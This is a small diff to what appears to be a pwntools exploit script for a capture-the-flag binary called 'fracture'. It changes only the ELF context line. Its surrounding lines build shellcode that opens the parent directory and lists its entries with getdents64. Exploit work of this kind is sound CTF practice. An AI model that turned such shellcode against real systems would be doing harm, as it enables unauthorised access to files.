@@ -1,6 +1,6 @@
 from pwn import *
 
-elf = context.binary = ELF("/home/kali/cybertalent/fracture")
+context.binary = ELF("/home/kali/cybertalent/fracture")
 
 shellcode =  shellcraft.open("..")
 shellcode += shellcraft.getdents64("x0", "sp", 0x321)
